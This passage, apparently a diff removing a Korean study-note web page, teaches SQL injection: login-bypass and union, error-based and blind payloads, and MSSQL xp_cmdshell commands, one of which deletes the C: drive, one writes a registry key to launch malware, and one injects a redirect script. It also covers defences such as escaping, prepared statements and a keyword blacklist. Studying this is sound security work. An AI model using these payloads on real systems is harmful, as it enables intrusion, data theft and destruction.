-          &lt;li&gt;구조
-            &lt;ul&gt;
-              &lt;li&gt;HTML
-                &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      &amp;lt;form&amp;gt;
-          &amp;lt;input /&amp;gt;
-          &amp;lt;submit&amp;gt;
-      &amp;lt;/form&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                &lt;/div&gt;
-              &lt;/li&gt;
-              &lt;li&gt;웹서버
-                &lt;ul&gt;
-                  &lt;li&gt;PHP, JSP, ASP 처리&lt;/li&gt;
-                  &lt;li&gt;쿼리문 생성&lt;/li&gt;
-                  &lt;li&gt;WHERE 절을 TRUE 로 만든다 (공격예시)&lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-              &lt;li&gt;DB&lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;주석처리문자
-            &lt;ul&gt;
-              &lt;li&gt;MySQL : # , MSSQL : –, ORACLE : –&lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;URL 인코딩 (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%xx&lt;/code&gt; 로 표기, xx 는 16진수)
-            &lt;ul&gt;
-              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt; -&amp;gt; %23&lt;/li&gt;
-              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&lt;/code&gt; -&amp;gt; %2D&lt;/li&gt;
-              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;&lt;/code&gt; -&amp;gt; %27&lt;/li&gt;
-              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;=&lt;/code&gt; -&amp;gt; %3D&lt;/li&gt;
-              &lt;li&gt;공백 -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+&lt;/code&gt; 혹은 %20&lt;/li&gt;
-              &lt;li&gt;널문자 -&amp;gt; %00&lt;/li&gt;
-              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; -&amp;gt; %3B&lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;취약점 있는지 여부 파악 방법
-            &lt;ul&gt;
-              &lt;li&gt;ID 입력 란에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;&lt;/code&gt; 나 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; 입력 후 테스트
-                &lt;ul&gt;
-                  &lt;li&gt;Error 메시지가 출력되면 입력 값이 DB에 전달된 것 (입력검증 X) : 취약&lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;예시
-            &lt;ul&gt;
-              &lt;li&gt;PHP 코드 (로그인처리)
-                &lt;ul&gt;
-                  &lt;li&gt;취약한 코드 예시
-                    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $query = select id, pw from member where id=&apos;$id&apos; and pw=&apos;$pw&apos;;
-  $result = mysql_query($query, $connect);
-  $num_rows = mysql_num_rows($result);
-  if($num_rows) {
-      $row = mysql_fetch_array($result);
-      $id = $row[id];
-      echo &quot;로그인 성공&quot;;
-  } else {
-      echo &quot;로그인 실패&quot;;
-  }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                    &lt;/div&gt;
-                  &lt;/li&gt;
-                  &lt;li&gt;사용자가 입력한 값을 그대로 변수에 담아옴&lt;/li&gt;
-                  &lt;li&gt;변수에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; or 1=1 #&lt;/code&gt; 입력할 경우
-                    &lt;ul&gt;
-                      &lt;li&gt;ID : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; or 1=1 #&lt;/code&gt;&lt;/li&gt;
-                      &lt;li&gt;pW : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;
-                        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  select id, pw from member where id=&apos;&apos; or 1=1#and pw=&apos;test&apos;;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                        &lt;/div&gt;
-                      &lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                  &lt;li&gt;URI 인코딩 메시지 (HTTP 요청메시지)
-                    &lt;ul&gt;
-                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id=&apos; or 1=1#&lt;/code&gt;&lt;/li&gt;
-                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id=%27+or+1%3d1%23&lt;/code&gt;&lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;대응책
-            &lt;ul&gt;
-              &lt;li&gt;PHP 설정파일 : php.ini
-                &lt;ul&gt;
-                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magic_quotes_gpc=on&lt;/code&gt; : GET, POST, Cookie 로 전달되는 데이터에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;&lt;/code&gt;(Single quote), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt;(Double quote), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;(Back slash), ``(Null)(0x00) 특수문자를 일반문자로 처리 (Escape 처리)&lt;/li&gt;
-                  &lt;li&gt;5.4 버전 이상에서는 설정값이 없고, mysql_real_escape_string() 함수 (MySQL 라이브러리 함수) 를 이용
-                    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      $id = mysql_real_escape_string($id)
-      $pw = mysql_real_escape_string($pw)
-      $query = select id, pw from member where id=&apos;$id&apos; and pw=&apos;$pw&apos;;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                    &lt;/div&gt;
-                    &lt;ul&gt;
-                      &lt;li&gt;결과 : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;select id, pw from member where id=&apos;\&apos; or 1=1#&apos;&lt;/code&gt;&lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-              &lt;li&gt;Prepared Statement (선처리 질의문)
-                &lt;ul&gt;
-                  &lt;li&gt;동적으로 쿼리를 생성하지 않음&lt;/li&gt;
-                  &lt;li&gt;사용자의 입력값을 바인딩 처리
-                    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      $stmt=$conn-&amp;gt;prepare(&quot;select id, pw from member where id=? and pw=?&quot;);
-      $stmt-&amp;gt;bind_param($id, $pw);
-      $stmt-&amp;gt;execute();
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                    &lt;/div&gt;
-                  &lt;/li&gt;
-                  &lt;li&gt;입력값을 제외하고 사전 컴파일 처리&lt;/li&gt;
-                  &lt;li&gt;입력값은 명령어가 아닌 입력값으로만 처리&lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-              &lt;li&gt;파라미터 필터링을 이용한 SQL Injection 방지
-                &lt;ul&gt;
-                  &lt;li&gt;블랙리스트 생성
-                    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      function chk_blacklist($str){
-          $returnVal = false;
-          $blist = array(&apos;\&apos;&apos;,&apos;\&quot;&apos;,&apos;#&apos;,&apos;--&apos;,&apos;union&apos;,&apos;selector&apos;,&apos;update&apos;,&apos;or&apos;,&apos;and&apos;,&apos;insert&apos;,&apos;update&apos;)
-
-          ###for 문 체크
-              if 포함 $returnVal = true; break;
-          ###
-
-          return $returnVal;
-      }
-
-      $chk_id = chk_blacklist($id);
-      $chk_pw = chk_blacklist($pw);
-      if (chk_id || chk_pw){
-          ...
-      }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                    &lt;/div&gt;
-                  &lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Union SQL Injection
-        &lt;ul&gt;
-          &lt;li&gt;Union 명령어
-            &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      select id, pw from member where id=&apos;test&apos;;
-      select id, pw from member where id=&apos;test&apos; union select &apos;test&apos;, &apos;1212&apos;; -- 결과값이 같을 경우 하나로 표기
-      select id, pw from member where id=&apos;test&apos; union all select &apos;test&apos;, &apos;1212&apos;; -- 결과값이 같을 경우 중복 표기
-      select id, pw from member where id=&apos;&apos; union select &apos;test&apos;,&apos;1234&apos;;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
-            &lt;ul&gt;
-              &lt;li&gt;조건 : Union 은 필드의 개수가 똑같아야 결합 가능&lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;컬럼을 파악할 때 사용하는 명령
-  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;select * from member where id=&apos;&apos; order by 4#;&lt;/code&gt;
-            &lt;ul&gt;
-              &lt;li&gt;Error code : Unknown column ‘4’ in ‘order clause’ (필드가 3개라 판단)&lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;공격방식
-            &lt;ul&gt;
-              &lt;li&gt;id 부분에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; union select &apos;test&apos;, &apos;1234&apos;#&lt;/code&gt; 입력
-                &lt;ul&gt;
-                  &lt;li&gt;오류없이 인증 우회 가능&lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;예시 : 값 비교를 통한 form SQL Injection 방어 코드
-            &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      $query = &quot;select id, pw from member where id=$id&quot;;
-      $result = mysql_query($query, $conn);
-      $num_rows = mysql_num_rows($result);
-      if($num_rows) {
-          $row = mysql_fetch_array($result);
-          $id = $row[id];
-          $rec_pw = $row[pw]; // 첫번째 레코드의 pw 값을 저장
-          if($pw != $rec_pw) {echo &quot;로그인실패&quot;} else {echo &quot;로그인성공&quot;}
-      }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
-            &lt;ul&gt;
-              &lt;li&gt;Union SQL Injection 에 취약
-                &lt;ul&gt;
-                  &lt;li&gt;id : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; union&apos; select &apos;test&apos;, &apos;test&apos; #&lt;/code&gt;&lt;/li&gt;
-                  &lt;li&gt;pw : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;&lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Stored Procedure SQL Injection
-        &lt;ul&gt;
-          &lt;li&gt;저장 프로시저는 여러 쿼리문을 하나의 함수처럼 실행하여 사용하는 쿼리의 집합을 의미&lt;/li&gt;
-          &lt;li&gt;특정 작업을 일괄 처리하기 위한 용도로 사용&lt;/li&gt;
-          &lt;li&gt;명령어
-            &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      exec master..xp_cmdshell &apos;dir c:\&apos;
-      exec master..xp_cmdshell &apos;del c:\ /q/s&apos;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
-            &lt;ul&gt;
-              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec master.dbo.xp_cmdshell &apos;시스템명령어&apos;&lt;/code&gt;&lt;/li&gt;
-              &lt;li&gt;확장형 저장프로시저
-                &lt;ul&gt;
-                  &lt;li&gt;xp_cmdshell
-                    &lt;ul&gt;
-                      &lt;li&gt;관리자의 권한으로 임의의 명령을 수행&lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                  &lt;li&gt;xp_regwrite
-                    &lt;ul&gt;
-                      &lt;li&gt;레지스트리 작성&lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec master.dbo.xp_dirtree &apos;c:\&apos;&lt;/code&gt;
-                    &lt;ul&gt;
-                      &lt;li&gt;디렉토리 구조&lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                  &lt;li&gt;공격예시
-                    &lt;ul&gt;
-                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.php?tt=1234;exec master.dbo.xp_cmdshell &apos;ping 192.168.10.0&apos;&lt;/code&gt;
-                        &lt;ul&gt;
-                          &lt;li&gt;뒤의 명령도 실행됨.&lt;/li&gt;
-                        &lt;/ul&gt;
-                      &lt;/li&gt;
-                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.php?tt=1234;exec xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;\software\microsoft\window...&apos;,&apos;winhelp&apos;,REG_SZ,&apos;c:\temp\hac.exe&apos;&lt;/code&gt;
-                        &lt;ul&gt;
-                          &lt;li&gt;레지스트리 키 작성, 윈도우 도움말을 볼 때 악성코드 실행&lt;/li&gt;
-                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c:\temp\hac.exe&lt;/code&gt; : 공격자가 심어놓은 악성코드&lt;/li&gt;
-                        &lt;/ul&gt;
-                      &lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Mass SQL Injection
-        &lt;ul&gt;
-          &lt;li&gt;기존의 SQL-Injection 기법보다 확장된 개념&lt;/li&gt;
-          &lt;li&gt;보안장비와 필터링 설정을 우회하는 기법 (2가지 방법)
-            &lt;ul&gt;
-              &lt;li&gt;공격쿼리의 일부분을 HEX 인코딩&lt;/li&gt;
-              &lt;li&gt;전체 쿼리를 HEX 인코딩&lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;대량의 DB값이 변조되어 홈페이지에 치명적인 악영향&lt;/li&gt;
-          &lt;li&gt;DB값 변조시 악성 스크립트를 삽입
-            &lt;ul&gt;
-              &lt;li&gt;사용자들이 변조된 사이트를 방문시 감염&lt;/li&gt;
-              &lt;li&gt;BOT이 설치되어 계정 해킹이나 DDOS 공격에 이용&lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;대상
-            &lt;ul&gt;
-              &lt;li&gt;공격대상이 MS-SQL 을 사용&lt;/li&gt;
-              &lt;li&gt;ASP 가 가동중인 IIS 웹서버&lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;특징
-            &lt;ul&gt;
-              &lt;li&gt;데이터베이스에 악성코드를 대량으로 삽입&lt;/li&gt;
-              &lt;li&gt;자동 삽입 스크립트를 사용하여 한번에 악성코드를 대량 삽입&lt;/li&gt;
-              &lt;li&gt;POST 나 HTTP Header (쿠키, 리퍼러) 를 이용한 경우 공격 로그를 찾기 어려움&lt;/li&gt;
-              &lt;li&gt;악성코드 삽입 과정에서 데이터의 손실 발생&lt;/li&gt;
-              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script src=...&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; 태그를 삽입, js, swf, exe 파일&lt;/li&gt;
-              &lt;li&gt;HEX 코드로 인코딩 변환
-                &lt;ul&gt;
-                  &lt;li&gt;대상 코드
-                    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      begin
-          exec (&apos;update&apos; + @t + &apos; set&apos; + @c + &quot; = &quot; &amp;lt;script&amp;gt; document.location = &quot;http://www.xxx.com&quot;&amp;lt;/script&amp;gt;&apos;&quot;)
-      end
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                    &lt;/div&gt;
-                  &lt;/li&gt;
-                  &lt;li&gt;FW 등의 필터링을 우회&lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;대응방법
-            &lt;ul&gt;
-              &lt;li&gt;declare 구문을 이용한 공격방식 차단
-                &lt;ul&gt;
-                  &lt;li&gt;위해 웹 소스상의 쿼리스트링 길이 제한&lt;/li&gt;
-                  &lt;li&gt;소스코드 수정 (중-장기 대응방안)&lt;/li&gt;
-                  &lt;li&gt;입력문자의 필터링&lt;/li&gt;
-                  &lt;li&gt;DB, System 정기 백업&lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;공격유형에 따른 분류
-    &lt;ul&gt;
-      &lt;li&gt;에러 기반 SQL Injection
-        &lt;ul&gt;
-          &lt;li&gt;개요
-            &lt;ul&gt;
-              &lt;li&gt;DB 쿼리 결과의 에러값을 이용하여 원하는 정보를 점진적으로 얻어나감&lt;/li&gt;
-              &lt;li&gt;DB 에러가 외부로 노출되는 취약점을 이용한 공격&lt;/li&gt;
-              &lt;li&gt;Error 메시지를 노출하지 않으면 사용할 수 없음&lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;예시
-            &lt;ul&gt;
-              &lt;li&gt;테이블명 및 필드명 획득
-                &lt;ul&gt;
-                  &lt;li&gt;having 이용
-                    &lt;ul&gt;
-                      &lt;li&gt;검색 창이 있을 시
-                        &lt;ul&gt;
-                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;select * from member ... &lt;/code&gt;&lt;/li&gt;
-                        &lt;/ul&gt;
-                      &lt;/li&gt;
-                      &lt;li&gt;group by 절이 컬럼을 기준으로 그룹을 만들 때 having 은 결과를 한번 더 필터링&lt;/li&gt;
-                      &lt;li&gt;` having 1=1 –`&lt;/li&gt;
-                      &lt;li&gt;오류메시지 : member.idx 열이 집계함수나 Group by 절에 없으므로 select 목록에서 사용할 수 없음… ‘??? 의 line ?번’
-                        &lt;ul&gt;
-                          &lt;li&gt;member : 테이블명&lt;/li&gt;
-                          &lt;li&gt;idx : 필드명&lt;/li&gt;
-                        &lt;/ul&gt;
-                      &lt;/li&gt;
-                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;group by idx --&lt;/code&gt;&lt;/li&gt;
-                      &lt;li&gt;오류메시지 : member.bId 열이 집계함수나 Group by 절에 없으므로 select 목록에서 사용할 수 없음… ‘??? 의 line ?번’&lt;/li&gt;
-                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;group by idx, bid --&lt;/code&gt; …&lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-              &lt;li&gt;컬럼(필드) 타입 획득
-                &lt;ul&gt;
-                  &lt;li&gt;sum() 이용 : 숫자형인지 여부&lt;/li&gt;
-                  &lt;li&gt;union 이용
-                    &lt;ul&gt;
-                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union select sum(컬럼명) from member --&lt;/code&gt;&lt;/li&gt;
-                      &lt;li&gt;오류메시지 : 숫자타입의 필드(컬럼) -&amp;gt; 동일 개수의 식이 있어야 합니다.&lt;/li&gt;
-                      &lt;li&gt;오류메시지 : VARCHAR 타입의 필드(컬럼) -&amp;gt; sum or avarage 연산에서는 varchar 타입 데이터 형식을 인수로 사용할 수 없습니다.&lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                  &lt;li&gt;필드의 개수를 알고 있을 때 필드의 타입을 획득하는 방법
-                    &lt;ul&gt;
-                      &lt;li&gt;union select 에 NULL 을 활용&lt;/li&gt;
-                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union select NULL,NULL,NULL,NULL from member&lt;/code&gt;&lt;/li&gt;
-                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union select 1,NULL,NULL,NULL from member&lt;/code&gt;
-                        &lt;ul&gt;
-                          &lt;li&gt;에러가 없으면 첫번째 컬럼은 Int 형&lt;/li&gt;
-                        &lt;/ul&gt;
-                      &lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                  &lt;li&gt;필드의 개수가 파악되면 ID, PW 를 받아올 수 있음
-                    &lt;ul&gt;
-                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union select idx, name, password, ...&lt;/code&gt;&lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Blind SQL Injection
-        &lt;ul&gt;
-          &lt;li&gt;개요
-            &lt;ul&gt;
-              &lt;li&gt;쿼리의 결과가 참인지 거짓인지의 반응으로 취약점 발견&lt;/li&gt;
-              &lt;li&gt;Limit 연산, substr(문자열 자르기), ASCII(아스키 코드 반환) 등 함수를 이용&lt;/li&gt;
-              &lt;li&gt;정보를 수집하고 필드값이나 테이블 명을 추측하여 공격&lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;예시
-            &lt;ul&gt;
-              &lt;li&gt;쿼리부분 예 (PHP)
-                &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      $query = &quot;select * from bbs
-      where $find like &apos;%$search%&quot;
-      order by idx desc&quot;;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                &lt;/div&gt;
-                &lt;ul&gt;
-                  &lt;li&gt;설명
-                    &lt;ul&gt;
-                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$search&lt;/code&gt; : 사용자가 입력한 검색어&lt;/li&gt;
-                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$find&lt;/code&gt; : 제목, 내용, 작성자, 내용+제목 등&lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                  &lt;li&gt;검색어에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; and 1=1#&lt;/code&gt; 입력 시
-                    &lt;ul&gt;
-                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;where $find like &apos;%&apos; and 1=1#%&lt;/code&gt;
-                        &lt;ul&gt;
-                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$find like &apos;%&apos;&lt;/code&gt; : True&lt;/li&gt;
-                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1=1&lt;/code&gt; : True&lt;/li&gt;
-                        &lt;/ul&gt;
-                      &lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                  &lt;li&gt;검색어에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; and 1=2#&lt;/code&gt; 입력 시
-                    &lt;ul&gt;
-                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;where $find like &apos;%&apos; and 1=1#%&lt;/code&gt;
-                        &lt;ul&gt;
-                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$find like &apos;%&apos;&lt;/code&gt; : True&lt;/li&gt;
-                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1=2&lt;/code&gt; : False&lt;/li&gt;
-                        &lt;/ul&gt;
-                      &lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                  &lt;li&gt;True 와 False 에 대한 결과로 BlindSQL Injection 가능여부를 판단&lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-              &lt;li&gt;스키마
-                &lt;ul&gt;
-                  &lt;li&gt;Information_schema : DB의 구조, 제약조건 등 메타 데이터를 제공&lt;/li&gt;
-                  &lt;li&gt;Information_schema.tables : 모든 테이블에 대한 정보&lt;/li&gt;
-                  &lt;li&gt;Information_shcema.columns : 모든 테이블의 컬럼정보&lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-              &lt;li&gt;함수
-                &lt;ul&gt;
-                  &lt;li&gt;limit : 출력 레코드의 개수를 제한하는 함수 (ex:limit pos,len)&lt;/li&gt;
-                  &lt;li&gt;substr : 문자열을 추출하는 함수 (ex:substr(문자열, pos, len))
-                    &lt;ul&gt;
-                      &lt;li&gt;pos : 시작위치 / len : 문자개수
-                        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  select table_schema, table_name, table_type from information_schema.tables
-  where table_type = &apos;base table&apos; -- 사용자가 만든 테이블
-  limit 0,1 ;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                        &lt;/div&gt;
-                      &lt;/li&gt;
-                      &lt;li&gt;사용자가 만든 테이블을 처음부터 1개 가져오기
-                        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  select substr((select table_name from information_shcema.tables where table_type = &apos;base table&apos; limit 0, 1), 1, 1) from dual;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                        &lt;/div&gt;
-                      &lt;/li&gt;
-                      &lt;li&gt;사용자가 만든 테이블명을 처음부터 1개 가져와서 앞자리 확인
-                        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  select column_name from information_schema.columns
-  where table_name = &apos;employee&apos; 
-  limit 0, 1;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                        &lt;/div&gt;
-                      &lt;/li&gt;
-                      &lt;li&gt;테이블명이 ‘employee’ 인 컬럼명을 처음부터 1개 가져오기&lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-              &lt;li&gt;활용법
-                &lt;ul&gt;
-                  &lt;li&gt;검색창에 입력
-                    &lt;ul&gt;
-                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; and substr((select table_name from information_schema.tables where table_type=&apos;base table&apos; limit 0,1),1,1)=&apos;a&apos;#&lt;/code&gt;&lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                  &lt;li&gt;완성 쿼리 내용
-                    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      select * from bbs where subhect like &apos;%
-      &apos; and substr((select table_name from information_schema.tables where table_type=&apos;base table&apos; limit 0,1),1,1)=&apos;a&apos;#%&apos;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                    &lt;/div&gt;
-                    &lt;ul&gt;
-                      &lt;li&gt;검색 결과값이 나오면 참, 결과값이 없으면 거짓&lt;/li&gt;
-                      &lt;li&gt;자동화된 툴을 이용해서 테이블 정보를 파악&lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;과정
-            &lt;ul&gt;
-              &lt;li&gt;Table 정보 -&amp;gt; 필드(Column) 정보 -&amp;gt; Data 획득
-                &lt;ul&gt;
